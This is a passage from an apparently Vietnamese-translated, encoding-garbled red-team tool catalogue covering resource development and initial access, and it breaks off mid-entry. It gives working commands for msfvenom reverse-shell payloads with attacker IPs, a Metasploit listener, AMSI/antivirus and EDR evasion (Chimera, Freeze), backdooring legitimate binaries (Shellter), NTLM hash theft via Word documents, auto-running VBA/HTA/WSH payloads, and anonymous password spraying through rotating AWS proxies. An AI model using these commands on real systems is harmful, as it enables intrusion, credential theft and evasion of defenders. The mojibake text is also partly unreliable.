**Resource Development**
====================

### [ğŸ”™](#tool-list)[**remoteInjector**](https://github.com/JohnWoodman/remoteinjector)

TiÃªm liÃªn káº¿t Ä‘áº¿n máº«u word tá»« xa vÃ o tÃ i liá»‡u word.

Tiá»‡n Ã­ch dá»±a trÃªn **Python** nÃ y sá»­a Ä‘á»•i liÃªn káº¿t `settings.xml.rels` cá»§a tá»‡p **.docx** trá» Ä‘áº¿n má»™t máº«u **.dotm** Ä‘Æ°á»£c lÆ°u trá»¯ tá»« xa chá»©a macro **VBA**, thá»±c thi khi tÃ i liá»‡u Ä‘Æ°á»£c má»Ÿ vÃ  cÃ¡c macro Ä‘Æ°á»£c báº­t.

[BÃ i Ä‘Äƒng trÃªn Blog liÃªn quan](https://john-woodman.com/research/vba-macro-remote-template-injection/)

**CÃ i Ä‘áº·t:**

```bash
git clone https://github.com/JohnWoodman/remoteinjector;cd remoteinjector
```
**LÆ°u Ã½:** CÃ i Ä‘áº·t tiÃªu chuáº©n báº±ng **Git** vÃ  Ä‘iá»u hÆ°á»›ng Ä‘áº¿n thÆ° má»¥c cá»§a cÃ´ng cá»¥.

**CÃ¡ch sá»­ dá»¥ng:**

```bash
python3 remoteinjector.py -w https://example.com/template.dotm example.docx
```
**LÆ°u Ã½:** Lá»‡nh nÃ y cháº¡y **script Python remoteinjector.py** vá»›i cá» `-w` chá»‰ Ä‘á»‹nh URL cá»§a máº«u tá»« xa vÃ  Ä‘á»‘i sá»‘ cuá»‘i cÃ¹ng lÃ  tá»‡p `.docx` sáº½ bá»‹ sá»­a Ä‘á»•i.

### [ğŸ”™](#tool-list)[**Chimera**](https://github.com/tokyoneon/Chimera)

**Chimera** lÃ  má»™t **script PowerShell** dÃ¹ng Ä‘á»ƒ che giáº¥u (**obfuscation**) nháº±m bá» qua **AMSI** vÃ  cÃ¡c giáº£i phÃ¡p **antivirus**. NÃ³ xá»­ lÃ½ cÃ¡c **script PowerShell** Ä‘á»™c háº¡i Ä‘Æ°á»£c biáº¿t lÃ  gÃ¢y kÃ­ch hoáº¡t **AV** vÃ  sá»­ dá»¥ng ká»¹ thuáº­t thay tháº¿ chuá»—i (**string substitution**) vÃ  ghÃ©p biáº¿n (**variable concatenation**) Ä‘á»ƒ nÃ© trÃ¡nh cÃ¡c chá»¯ kÃ½ phÃ¡t hiá»‡n thÃ´ng thÆ°á»ng.

**CÃ i Ä‘áº·t:**

```bash
sudo apt-get update && sudo apt-get install -Vy sed xxd libc-bin curl jq perl gawk grep coreutils git
sudo git clone https://github.com/tokyoneon/chimera /opt/chimera
sudo chown $USER:$USER -R /opt/chimera/; cd /opt/chimera/
sudo chmod +x chimera.sh; ./chimera.sh --help
```
**LÆ°u Ã½:** CÃ¡c lá»‡nh cÃ i Ä‘áº·t dependency (`sed`, `xxd`, ...) vÃ  mÃ£ nguá»“n cá»§a **Chimera** trÃªn cÃ¡c há»‡ thá»‘ng **Linux/Debian/Ubuntu** sá»­ dá»¥ng **apt** vÃ  **Git**. `sudo` yÃªu cáº§u quyá»n **super user**. ChÃº Ã½ cÃ¡c lá»‡nh thay Ä‘á»•i quyá»n sá»Ÿ há»¯u vÃ  thá»±c thi.

**CÃ¡ch sá»­ dá»¥ng:**

```bash
./chimera.sh -f shells/Invoke-PowerShellTcp.ps1 -l 3 -o /tmp/chimera.ps1 -v -t powershell,windows,\
copyright -c -i -h -s length,get-location,ascii,stop,close,getstream -b new-object,reverse,\
invoke-expression,out-string,write-error -j -g -k -r -p
```
**LÆ°u Ã½:** VÃ­ dá»¥ sá»­ dá»¥ng **script bash chimera.sh** vá»›i nhiá»u tÃ¹y chá»n khÃ¡c nhau Ä‘á»ƒ che giáº¥u má»™t tá»‡p **PowerShell** cá»¥ thá»ƒ (`-f`), Ä‘áº·t má»©c Ä‘á»™ che giáº¥u (`-l`), lÆ°u káº¿t quáº£ ra tá»‡p (`-o`), báº­t cháº¿ Ä‘á»™ chi tiáº¿t (`-v`), chá»‰ Ä‘á»‹nh cÃ¡c loáº¡i chuyá»ƒn Ä‘á»•i/má»¥c tiÃªu che giáº¥u (`-t`, `-c`, `-i`, `-h`, `-s`, `-b`, `-j`, `-g`, `-k`, `-r`, `-p`). ÄÃ¢y lÃ  má»™t lá»‡nh phá»©c táº¡p thá»ƒ hiá»‡n sá»± Ä‘a dáº¡ng trong tÃ¹y chá»n che giáº¥u.

![image](https://user-images.githubusercontent.com/100603074/209867736-5c35cec0-9227-4f18-a439-a5c954342818.png)

### [ğŸ”™](#tool-list)[**msfvenom**](https://www.offensive-security.com/metasploit-unleashed/Msfvenom/)

**Msfvenom** cho phÃ©p táº¡o cÃ¡c **payload** cho cÃ¡c há»‡ Ä‘iá»u hÃ nh khÃ¡c nhau vá»›i nhiá»u Ä‘á»‹nh dáº¡ng Ä‘a dáº¡ng. NÃ³ cÅ©ng há»— trá»£ che giáº¥u **payload** Ä‘á»ƒ bá» qua AV.

**Thiáº¿t láº­p Listener**

```shell
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST your-ip
set LPORT listening-port
run
```
**LÆ°u Ã½:** ÄÃ¢y lÃ  cÃ¡c lá»‡nh trong **Metasploit Framework** Ä‘á»ƒ thiáº¿t láº­p má»™t **listener** chung (`exploit/multi/handler`) láº¯ng nghe cÃ¡c káº¿t ná»‘i ngÆ°á»£c láº¡i. Báº¡n chá»n loáº¡i **payload** mong Ä‘á»£i (`windows/meterpreter/reverse_tcp`), Ä‘áº·t Ä‘á»‹a chá»‰ IP (`LHOST`) vÃ  cá»•ng (`LPORT`) mÃ  listener sáº½ láº¯ng nghe, sau Ä‘Ã³ cháº¡y nÃ³ (`run`).

#### Lá»‡nh Msfvenom

**PHP:**

```bash
msfvenom -p php/meterpreter/reverse_tcp lhost =192.168.0.9 lport=1234 R
```
**LÆ°u Ã½:** Táº¡o **payload PHP** (**reverse shell meterpreter**). `-p` chá»‰ Ä‘á»‹nh payload. `lhost` vÃ  `lport` lÃ  Ä‘á»‹a chá»‰/cá»•ng cá»§a mÃ¡y attacker láº¯ng nghe. `R` cÃ³ thá»ƒ lÃ  lá»—i Ä‘Ã¡nh mÃ¡y hoáº·c má»™t cá» khÃ´ng chuáº©n, thÆ°á»ng khÃ´ng cáº§n thiáº¿t cho payload PHP cÆ¡ báº£n.

**Windows:**

```bash
msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
```
**LÆ°u Ã½:** Táº¡o **payload** (**reverse shell**) cho **Windows**, Ä‘á»‹nh dáº¡ng **EXE** (`-f exe`). `LHOST` vÃ  `LPORT` lÃ  Ä‘á»‹a chá»‰/cá»•ng cá»§a listener. Káº¿t quáº£ Ä‘Æ°á»£c xuáº¥t ra tá»‡p `shell-x86.exe`. ÄÃ¢y lÃ  **payload** 32-bit cÆ¡ báº£n.

**Linux:**

```bash
msfvenom -p linux/x86/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf
```
**LÆ°u Ã½:** TÆ°Æ¡ng tá»± nhÆ° trÃªn, nhÆ°ng táº¡o **payload reverse shell** 32-bit cho **Linux** Ä‘á»‹nh dáº¡ng **ELF** (`-f elf`).

**Java:**

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.jsp
```
**LÆ°u Ã½:** Táº¡o **payload** (**reverse shell**) cho **Java** Ä‘á»‹nh dáº¡ng **JSP** (`-f raw`), thÃ­ch há»£p Ä‘á»ƒ triá»ƒn khai trÃªn cÃ¡c web server Java (vÃ­ dá»¥: Tomcat).

**HTA:**

```bash
msfvenom -p windows/shell_reverse_tcp lhost=192.168.1.3 lport=443 -f hta-psh > shell.hta
```
**LÆ°u Ã½:** Táº¡o **payload** (**reverse shell**) cho **Windows** dÆ°á»›i dáº¡ng á»©ng dá»¥ng **HTA** (**HTML Application**) sá»­ dá»¥ng **PowerShell** (`-f hta-psh`). Tá»‡p **HTA** nÃ y cÃ³ thá»ƒ Ä‘Æ°á»£c cháº¡y trá»±c tiáº¿p trÃªn **Windows** vÃ  thÆ°á»ng bá» qua má»™t sá»‘ háº¡n cháº¿ thá»±c thi **script**.

![image](https://user-images.githubusercontent.com/100603074/192070870-2e65fc9f-6534-42e2-af27-9d8b54a82f0b.png)

### [ğŸ”™](#tool-list)[**Shellter**](https://www.shellterproject.com/)

**Shellter** lÃ  má»™t **cÃ´ng cá»¥** tiÃªm **shellcode** Ä‘á»™ng vÃ  lÃ  trÃ¬nh lÃ¢y nhiá»…m PE Ä‘á»™ng Ä‘áº§u tiÃªn Ä‘Æ°á»£c táº¡o ra.

NÃ³ cÃ³ thá»ƒ Ä‘Æ°á»£c sá»­ dá»¥ng Ä‘á»ƒ tiÃªm **shellcode** vÃ o cÃ¡c á»©ng dá»¥ng Windows gá»‘c (hiá»‡n táº¡i chá»‰ há»— trá»£ á»©ng dá»¥ng 32-bit).

**Shellter** táº­n dá»¥ng cáº¥u trÃºc ban Ä‘áº§u cá»§a tá»‡p PE vÃ  khÃ´ng Ã¡p dá»¥ng báº¥t ká»³ sá»­a Ä‘á»•i nÃ o nhÆ° thay Ä‘á»•i quyá»n truy cáº­p bá»™ nhá»› trong cÃ¡c section (trá»« khi ngÆ°á»i dÃ¹ng muá»‘n), thÃªm section phá»¥ vá»›i quyá»n truy cáº­p RWE, vÃ  whatever would look dodgy under an AV scan.

ThÃ´ng tin **README** Ä‘áº§y Ä‘á»§ cÃ³ thá»ƒ Ä‘Æ°á»£c tÃ¬m tháº¥y [táº¡i Ä‘Ã¢y](https://www.shellterproject.com/Downloads/Shellter/Readme.txt).

**CÃ i Ä‘áº·t: (Kali)**

```bash
apt-get update
apt-get install shellter
```
**LÆ°u Ã½:** CÃ i Ä‘áº·t tiÃªu chuáº©n trÃªn **Kali Linux** hoáº·c cÃ¡c há»‡ thá»‘ng **Debian/Ubuntu** báº±ng **apt**.

**CÃ i Ä‘áº·t: (**Windows**)**

Truy cáº­p [trang táº£i xuá»‘ng](https://www.shellterproject.com/download/) vÃ  cÃ i Ä‘áº·t.

**CÃ¡ch sá»­ dá»¥ng:**

Just pick a legit binary to backdoor and run Shellter.

Some nice tips can be found [here](https://www.shellterproject.com/tipstricks/).

Lots of community usage demos can be found [here](https://www.shellterproject.com/shellter-community-demos/).

![image](https://user-images.githubusercontent.com/100603074/216729343-612cde48-0ce1-48e6-b342-5252193a974c.png)

*HÃ¬nh áº£nh Ä‘Æ°á»£c sá»­ dá»¥ng tá»« https://www.kali.org/tools/shellter/images/shellter.png*

### [ğŸ”™](#tool-list)[**Freeze**](https://github.com/optiv/Freeze)

**Freeze** lÃ  má»™t **cÃ´ng cá»¥** táº¡o **payload** Ä‘Æ°á»£c sá»­ dá»¥ng Ä‘á»ƒ vÆ°á»£t qua cÃ¡c biá»‡n phÃ¡p kiá»ƒm soÃ¡t báº£o máº­t **EDR** Ä‘á»ƒ thá»±c thi **shellcode** má»™t cÃ¡ch lÃ©n lÃºt.

**Freeze** sá»­ dá»¥ng nhiá»u ká»¹ thuáº­t khÃ´ng chá»‰ Ä‘á»ƒ loáº¡i bá» cÃ¡c **hook EDR** á»Ÿ má»©c **Userland** mÃ  cÃ²n thá»±c thi **shellcode** theo cÃ¡ch nÃ© trÃ¡nh cÃ¡c biá»‡n phÃ¡p giÃ¡m sÃ¡t Ä‘iá»ƒm cuá»‘i khÃ¡c.

**CÃ i Ä‘áº·t:**

```bash
git clone https://github.com/optiv/Freeze
cd Freeze
go build Freeze.go
```
**LÆ°u Ã½:** CÃ¡c lá»‡nh cÃ i Ä‘áº·t tiÃªu chuáº©n cho há»‡ thá»‘ng cÃ³ cÃ i Ä‘áº·t **Git** vÃ  **Go** Ä‘á»ƒ táº£i mÃ£ nguá»“n vÃ  build file thá»±c thi.

**CÃ¡ch sá»­ dá»¥ng:**

```
  -I string
        ÄÆ°á»ng dáº«n Ä‘áº¿n shellcode raw 64-bit.
  -O string
        TÃªn tá»‡p Ä‘áº§u ra (vÃ­ dá»¥: loader.exe hoáº·c loader.dll). TÃ¹y thuá»™c vÃ o pháº§n má»Ÿ rá»™ng tá»‡p Ä‘Æ°á»£c xÃ¡c Ä‘á»‹nh, Freeze sáº½ táº¡o ra dll hoáº·c exe.
  -console
        Chá»‰ dÃ nh cho Binary Payload - Táº¡o thÃ´ng tin console chi tiáº¿t khi payload Ä‘Æ°á»£c thá»±c thi. Äiá»u nÃ y sáº½ vÃ´ hiá»‡u hÃ³a tÃ­nh nÄƒng cá»­a sá»• áº©n.
  -encrypt
        MÃ£ hÃ³a shellcode báº±ng mÃ£ hÃ³a AES 256
  -export string
        Chá»‰ dÃ nh cho DLL Loaders - Chá»‰ Ä‘á»‹nh má»™t hÃ m Export cá»¥ thá»ƒ cho loader.
  -process string
        TÃªn cá»§a tiáº¿n trÃ¬nh sáº½ táº¡o ra. Tiáº¿n trÃ¬nh nÃ y pháº£i tá»“n táº¡i trong C:\Windows\System32\. VÃ­ dá»¥ 'notepad.exe' (máº·c Ä‘á»‹nh "notepad.exe")
  -sandbox
        Cho phÃ©p nÃ© trÃ¡nh sandbox báº±ng cÃ¡ch kiá»ƒm tra:
                Äiá»ƒm cuá»‘i cÃ³ tham gia domain khÃ´ng?
                Äiá»ƒm cuá»‘i cÃ³ nhiá»u hÆ¡n 2 CPU khÃ´ng?
                Äiá»ƒm cuá»‘i cÃ³ nhiá»u hÆ¡n 4 GB RAM khÃ´ng?
  -sha256
        Cung cáº¥p giÃ¡ trá»‹ SHA256 cá»§a loader (Äiá»u nÃ y há»¯u Ã­ch cho viá»‡c theo dÃµi)
```
**LÆ°u Ã½:** ÄÃ¢y lÃ  output mÃ n hÃ¬nh trá»£ giÃºp cá»§a **cÃ´ng cá»¥ Freeze**, liá»‡t kÃª cÃ¡c tham sá»‘ dÃ²ng lá»‡nh Ä‘á»ƒ táº¡o payload. Báº¡n cung cáº¥p shellcode input (`-I`), tÃªn file output (`-O`), vÃ  cÃ³ thá»ƒ chá»‰ Ä‘á»‹nh cÃ¡c ká»¹ thuáº­t evasive (`-process`, `-sandbox`), mÃ£ hÃ³a (`-encrypt`), v.v.

![image](https://user-images.githubusercontent.com/100603074/216729312-6e03f5d2-29a7-4190-8187-daecebfc6a9c.png)

*HÃ¬nh áº£nh Ä‘Æ°á»£c sá»­ dá»¥ng tá»« https://www.blackhatethicalhacking.com/tools/freeze/*

### [ğŸ”™](#tool-list)[**WordSteal**](https://github.com/0x09AL/WordSteal)

**Script** nÃ y sáº½ táº¡o má»™t tÃ i liá»‡u **Microsoft Word** vá»›i má»™t hÃ¬nh áº£nh tá»« xa (**remote image**), cho phÃ©p thu tháº­p cÃ¡c hash **NTLM** tá»« má»™t Ä‘iá»ƒm cuá»‘i má»¥c tiÃªu tá»« xa.

**Microsoft Word** cÃ³ kháº£ nÄƒng bao gá»“m cÃ¡c hÃ¬nh áº£nh tá»« cÃ¡c vá»‹ trÃ­ tá»« xa, bao gá»“m cáº£ hÃ¬nh áº£nh tá»« xa Ä‘Æ°á»£c lÆ°u trá»¯ trÃªn má»™t **SMB server** do káº» táº¥n cÃ´ng kiá»ƒm soÃ¡t. Äiá»u nÃ y táº¡o cÆ¡ há»™i Ä‘á»ƒ báº¡n láº¯ng nghe vÃ  thu tháº­p cÃ¡c hash **NTLM** Ä‘Æ°á»£c gá»­i khi má»™t náº¡n nhÃ¢n Ä‘Ã£ xÃ¡c thá»±c má»Ÿ tÃ i liá»‡u **Word** vÃ  hiá»ƒn thá»‹ hÃ¬nh áº£nh.

**CÃ i Ä‘áº·t:**

```
git clone https://github.com/0x09AL/WordSteal
cd WordSteal
```
**LÆ°u Ã½:** CÃ i Ä‘áº·t tiÃªu chuáº©n báº±ng **Git** vÃ  chuyá»ƒn vÃ o thÆ° má»¥c cá»§a cÃ´ng cá»¥. YÃªu cáº§u cÃ i Ä‘áº·t **Python**.

**CÃ¡ch sá»­ dá»¥ng:**

```bash
# Generate document containing 'test.jpg' and start listener
./main.py 127.0.0.1 test.jpg 1

# Generate document containing 'test.jpg' and do not start listener
./main.py 127.0.0.1 test.jpg 0\n
```
**LÆ°u Ã½:** CÃ¡c vÃ­ dá»¥ cháº¡y **script Python main.py**. Tham sá»‘ lÃ  IP cá»§a mÃ¡y attacker láº¯ng nghe **SMB**, tÃªn file áº£nh dummy (test.jpg) vÃ  má»™t cá» (1 Ä‘á»ƒ báº¯t Ä‘áº§u listener, 0 Ä‘á»ƒ khÃ´ng). Tá»‡p `.docx` Ä‘Æ°á»£c táº¡o sáº½ chá»©a tham chiáº¿u Ä‘áº¿n áº£nh táº¡i `\\<attacker_ip>\test.jpg`. MÃ¡y attacker cáº§n cÃ³ **server SMB** vÃ  **tool** báº¯t **hash** (vÃ­ dá»¥: **Responder**) hoáº¡t Ä‘á»™ng trÃªn IP Ä‘Ã£ cung cáº¥p.

![image](https://user-images.githubusercontent.com/100603074/217653886-09bf9eba-a117-47b9-99b4-12fb2d73ef44.png)

*HÃ¬nh áº£nh Ä‘Æ°á»£c sá»­ dá»¥ng tá»« https://pentestit.com/wordsteal-steal-ntlm-hashes-remotely/*

### [ğŸ”™](#tool-list)[**HÃ m NTAPI chÆ°a Ä‘Æ°á»£c tÃ i liá»‡u hÃ³a**](http://undocumented.ntinternals.net/)

Trang web nÃ y cung cáº¥p thÃ´ng tin vá» cÃ¡c ná»™i bá»™ Windows chÆ°a Ä‘Æ°á»£c tÃ i liá»‡u hÃ³a, cÃ¡c cuá»™c gá»i há»‡ thá»‘ng, cáº¥u trÃºc dá»¯ liá»‡u vÃ  cÃ¡c chi tiáº¿t cáº¥p tháº¥p khÃ¡c cá»§a há»‡ Ä‘iá»u hÃ nh Windows.

ÄÃ¢y cÃ³ thá»ƒ lÃ  má»™t nguá»“n tÃ i nguyÃªn quÃ½ giÃ¡ cho nhá»¯ng cÃ¡ nhÃ¢n muá»‘n khÃ¡m phÃ¡ ná»™i bá»™ cá»§a **Windows** vÃ¬ nhiá»u má»¥c Ä‘Ã­ch, bao gá»“m phÃ¢n tÃ­ch lá»— há»•ng, phÃ¡t triá»ƒn khai thÃ¡c vÃ  nÃ¢ng quyá»n cá»¥c bá»™.

Khi phÃ¡t triá»ƒn khai thÃ¡c, viá»‡c hiá»ƒu rÃµ ná»™i bá»™ cá»§a há»‡ thá»‘ng má»¥c tiÃªu lÃ  ráº¥t quan trá»ng. Trang web nÃ y cÃ³ thá»ƒ giÃºp phÃ¡t triá»ƒn khai thÃ¡c báº±ng cÃ¡ch táº­n dá»¥ng cÃ¡c khÃ­a cáº¡nh cáº¥p tháº¥p chÆ°a Ä‘Æ°á»£c tÃ i liá»‡u hÃ³a cá»§a **Windows**.

**CÃ¡ch sá»­ dá»¥ng:**

Truy cáº­p [http://undocumented.ntinternals.net/](http://undocumented.ntinternals.net/)

![image](https://github.com/A-poc/RedTeam-Tools/assets/100603074/41b424f3-053c-440b-b0fd-235e95980d9a)

*HÃ¬nh áº£nh Ä‘Æ°á»£c sá»­ dá»¥ng tá»« http://undocumented.ntinternals.net/*

### [ğŸ”™](#tool-list)[**HÃ m Kernel Callback Functions**](https://codemachine.com/articles/kernel_callback_functions.html)

Ghi chÃº ká»¹ thuáº­t nÃ y cung cáº¥p danh sÃ¡ch Ä‘áº§y Ä‘á»§ táº¥t cáº£ cÃ¡c **API** Ä‘Æ°á»£c xuáº¥t bá»Ÿi **Windows Kernel**, cho phÃ©p trÃ¬nh Ä‘iá»u khiá»ƒn Ä‘Äƒng kÃ½ cÃ¡c hÃ m **callback** Ä‘Æ°á»£c gá»i bá»Ÿi cÃ¡c thÃ nh pháº§n kernel trong nhiá»u tÃ¬nh huá»‘ng khÃ¡c nhau.

Háº§u háº¿t cÃ¡c **routine** nÃ y Ä‘á»u Ä‘Æ°á»£c tÃ i liá»‡u hÃ³a trong **Windows Driver Kit (WDK)** nhÆ°ng má»™t sá»‘ Ä‘Æ°á»£c dÃ¹ng cho cÃ¡c trÃ¬nh Ä‘iá»u khiá»ƒn sáºµn cÃ³ (**in-box drivers**).

CÃ¡c hÃ m chÆ°a Ä‘Æ°á»£c tÃ i liá»‡u hÃ³a Ä‘Æ°á»£c mÃ´ táº£ ngáº¯n gá»n trong khi cÃ¡c hÃ m Ä‘Ã£ Ä‘Æ°á»£c tÃ i liá»‡u hÃ³a chá»‰ Ä‘Æ°á»£c liá»‡t kÃª á»Ÿ Ä‘Ã¢y Ä‘á»ƒ tham kháº£o.

**CÃ¡ch sá»­ dá»¥ng:**

Truy cáº­p [https://codemachine.com/articles/kernel_callback_functions.html](https://codemachine.com/articles/kernel_callback_functions.html)

![image](https://github.com/A-poc/RedTeam-Tools/assets/100603074/b7532b7d-1abc-4af6-be92-f6f78d24a788)

*HÃ¬nh áº£nh Ä‘Æ°á»£c sá»­ dá»¥ng tá»« https://codemachine.com*

### [ğŸ”™](#tool-list)[**OffensiveVBA**](https://github.com/S3cur3Th1sSh1t/OffensiveVBA)

Má»™t bá»™ sÆ°u táº­p cÃ¡c ká»¹ thuáº­t táº¥n cÃ´ng, **script** vÃ  liÃªn káº¿t há»¯u Ã­ch Ä‘á»ƒ thá»±c hiá»‡n thá»±c thi mÃ£ vÃ  nÃ© trÃ¡nh phÃ²ng thá»§ thÃ´ng qua cÃ¡c macro **Office**.

**CÃ¡ch sá»­ dá»¥ng:**

Truy cáº­p [https://github.com/S3cur3Th1sSh1t/OffensiveVBA#templates-in-this-repo](https://github.com/S3cur3Th1sSh1t/OffensiveVBA#templates-in-this-repo)

![image](https://github.com/A-poc/RedTeam-Tools/assets/100603074/7f7ad942-48d7-42e7-a3cc-55ec84139058)

*HÃ¬nh áº£nh Ä‘Æ°á»£c sá»­ dá»¥ng tá»« https://github.com/S3cur3Th1sSh1t*

### [ğŸ”™](#tool-list)**WSH**

**Táº¡o payload:**

```vbs
Set shell = WScript.CreateObject("Wscript.Shell")
shell.Run("C:\Windows\System32\calc.exe " & WScript.ScriptFullName),0,True
```
**LÆ°u Ã½:** ÄÃ¢y lÃ  mÃ£ **VBScript** táº¡o Ä‘á»‘i tÆ°á»£ng `WScript.Shell` vÃ  sá»­ dá»¥ng phÆ°Æ¡ng thá»©c `Run` Ä‘á»ƒ thá»±c thi `calc.exe` (mÃ¡y tÃ­nh). Sá»‘ `0` lÃ m Ä‘á»‘i sá»‘ thá»© hai cÃ³ nghÄ©a lÃ  cá»­a sá»• chÆ°Æ¡ng trÃ¬nh sáº½ áº©n. `WScript.ScriptFullName` cÃ³ váº» nhÆ° Ä‘Æ°á»£c Ä‘Æ°a vÃ o nhÆ° má»™t pháº§n cá»§a Ä‘Æ°á»ng dáº«n lá»‡nh, Ä‘iá»u nÃ y hÆ¡i láº¡ cho viá»‡c thá»±c thi `calc.exe` Ä‘Æ¡n giáº£n, cÃ³ thá»ƒ lÃ  vÃ­ dá»¥ cho cÃ¡c tÃ¡c vá»¥ phá»©c táº¡p hÆ¡n. Script nÃ y Ä‘Æ°á»£c thá»±c thi báº±ng trÃ¬nh thÃ´ng dá»‹ch `wscript.exe` hoáº·c `cscript.exe` cá»§a Windows Script Host (**WSH**).

**Execute:**

```bash
wscript payload.vbs
cscript.exe payload.vbs
wscript /e:VBScript payload.txt //If .vbs files are blacklisted
```
**LÆ°u Ã½:** CÃ¡c lá»‡nh nÃ y thá»±c thi **script WSH**. `wscript.exe` hiá»ƒn thá»‹ output trong há»™p thoáº¡i GUI, `cscript.exe` hiá»ƒn thá»‹ output trong console. DÃ²ng cuá»‘i cÃ¹ng cho tháº¥y cÃ¡ch chá»‰ Ä‘á»‹nh engine **VBScript** cho má»™t tá»‡p `.txt` Ä‘á»ƒ bá» qua viá»‡c cháº·n tá»‡p `.vbs`.

### [ğŸ”™](#tool-list)**HTA**

**Táº¡o payload:**

```html
<html>
<body>
<script>
	var c= 'cmd.exe'
	new ActiveXObject('WScript.Shell').Run(c);
</script>
</body>
</html>
```
**LÆ°u Ã½:** ÄÃ¢y lÃ  mÃ£ cá»§a má»™t tá»‡p **HTA** (**HTML Application**). Tá»‡p **HTA** Ä‘Æ°á»£c xá»­ lÃ½ bá»Ÿi `mshta.exe` trÃªn **Windows** vÃ  cÃ³ quyá»n truy cáº­p cÃ¡c Ä‘á»‘i tÆ°á»£ng **COM** nhÆ° `WScript.Shell`, cho phÃ©p thá»±c thi lá»‡nh há»‡ thá»‘ng (`cmd.exe`). NÃ³ khÃ¡c vá»›i cÃ¡c tá»‡p **HTML** thÃ´ng thÆ°á»ng Ä‘Æ°á»£c xá»­ lÃ½ bá»Ÿi trÃ¬nh duyá»‡t vá»›i sandbox háº¡n cháº¿ hÆ¡n. ÄÃ¢y lÃ  má»™t ká»¹ thuáº­t **execution** phá»• biáº¿n.

**Execute:** Run file
**LÆ°u Ã½:** Chá»‰ cáº§n má»Ÿ tá»‡p `.hta` trÃªn há»‡ thá»‘ng **Windows**.

### [ğŸ”™](#tool-list)**VBA**

**Táº¡o payload:**

```python
Sub calc()
	Dim payload As String
	payload = "calc.exe"
	CreateObject("Wscript.Shell").Run payload,0
End Sub
```
**LÆ°u Ã½:** ÄÃ¢y lÃ  mÃ£ **VBA** (Visual Basic for Applications) thÆ°á»ng Ä‘Æ°á»£c nhÃºng trong cÃ¡c tÃ i liá»‡u Microsoft Office (Word, Excel, PowerPoint, Access). Khi macro nÃ y Ä‘Æ°á»£c thá»±c thi, nÃ³ táº¡o má»™t Ä‘á»‘i tÆ°á»£ng `WScript.Shell` vÃ  cháº¡y `calc.exe`. Sá»‘ `0` á»Ÿ cuá»‘i lá»‡nh `Run` lÃ m cho cá»­a sá»• mÃ¡y tÃ­nh bá»‹ áº©n.

**Execute:** Set function to Auto_Open() in macro enabled document
**LÆ°u Ã½:** Äá»ƒ tá»± Ä‘á»™ng thá»±c thi khi tÃ i liá»‡u Ä‘Æ°á»£c má»Ÿ, tÃªn hÃ m **VBA** cáº§n lÃ  `Auto_Open()` (Word), `Auto_Actiavte()` (Excel) hoáº·c cÃ¡c hÃ m kÃ­ch hoáº¡t tá»± Ä‘á»™ng khÃ¡c, vÃ  ngÆ°á»i dÃ¹ng pháº£i cho phÃ©p thá»±c thi macro khi Ä‘Æ°á»£c há»i (hoáº·c náº¿u cÃ i Ä‘áº·t báº£o máº­t cho phÃ©p máº·c Ä‘á»‹nh).

**Initial Access**
====================

### [ğŸ”™](#tool-list)[**CredMaster**](https://github.com/knavesec/CredMaster)

Khá»Ÿi Ä‘á»™ng cuá»™c táº¥n cÃ´ng **password spray / brute force** thÃ´ng qua cÃ¡c proxy **Amazon AWS**, shifting the requesting IP address for every authentication attempt. This dynamically creates **FireProx APIs** for more evasive password sprays.

**CredMaster** provides a method of running anonymous password sprays against endpoints in a simple, easy to use tool. The **FireProx tool** provides the rotating request IP, while the base of **CredMaster** spoofs all other identifying information.

Features:
- Fully supports all AWS Regions
- Automatically generates APIs for proxy pass-through
- Spoofs API tracking numbers, forwarded-for IPs, and other proxy tracking headers
- Multi-threaded processing
- Password delay counters & configuration for lockout policy evasion
- Easily add new plugins
- Fully anonymous

**Install:**

```bash
git clone https://github.com/knavesec/CredMaster;cd CredMaster;pip install -r requirements.txt
```
**LÆ°u Ã½:** CÃ i Ä‘áº·t tiÃªu chuáº©n cho há»‡ thá»‘ng cÃ³ **Git** vÃ  **Python**.

Äá»ƒ biáº¿t hÆ°á»›ng dáº«n cÃ i Ä‘áº·t Ä‘áº§y Ä‘á»§, xem [táº¡i Ä‘Ã¢y](https://whynotsecurity.com/blog/credmaster/#setup).

**CÃ¡ch sá»­ dá»¥ng:**

```bash
python3 credmaster.py --plugin {pluginname} --access_key {key} --secret_access_key {key} -u userfile -p passwordfile -a useragentfile {otherargs}
python3 credmaster.py --config config.json
```
**LÆ°u Ã½:** CÃ¡c vÃ­ dá»¥ sá»­ dá»¥ng **script Python credmaster.py**. CÃ´ng cá»¥ nÃ y **báº¯t buá»™c** pháº£i cÃ³ **AWS API access keys** Ä‘Æ°á»£c cáº¥u hÃ¬nh vÃ  cung cáº¥p Ä‘á»ƒ cÃ³ thá»ƒ táº¡o vÃ  sá»­ dá»¥ng cÃ¡c **proxy FireProx**. `-u` vÃ  `-p` thÆ°á»ng Ä‘Æ°á»£c dÃ¹ng Ä‘á»ƒ cung cáº¥p tá»‡p chá»©a tÃªn ngÆ°á»i dÃ¹ng vÃ  máº­t kháº©u cho chiáº¿n dá»‹ch **password spraying**. Sá»­ dá»¥ng tá»‡p cáº¥u hÃ¬nh JSON (`--config`) cÅ©ng lÃ  má»™t tÃ¹y chá»n.

This tool requires **AWS API access keys**, a walkthrough on how to acquire these keys can be found here: https://bond-o.medium.com/aws-pass-through-proxy-84f1f7fa4b4b

![credmaster](https://github.com/user-attachments/assets/f678cca4-7a53-41e7-9323-51e8efd0e6ba)

*HÃ¬nh áº£nh Ä‘Æ°á»£c sá»­ dá»¥ng tá»« https://github.com/knavesec/CredMaster/wiki*

### [ğŸ”™](#tool-list)[**TREVORspray**](https://github.com/blacklanternsecurity/TREVORspray)

**TREVORspray** is a modular password sprayer with threading, SSH proxying, loot modules, and more!

**Install:**

```bash
pip install https://github.com/blacklanternsecurity/TREVORspray
```
**LÆ°u Ã½:** CÃ i Ä‘áº·t **toolkit Python** nÃ y trá»±c tiáº¿p tá»« URL **GitHub** báº±ng pip.

**CÃ¡ch sá»­ dá»¥ng:**

```bash
# Recon
python3 ./trevorspray --recon evilcorp.com

# Liá»‡t kÃª ngÆ°á»i dÃ¹ng thÃ´ng qua OneDrive
python3 ./trevorspray --recon evilcorp.com -u emails.txt --threads 10

# Spray chá»‘ng láº¡i nhá»¯ng gÃ¬ Ä‘Ã£ khÃ¡m phÃ¡
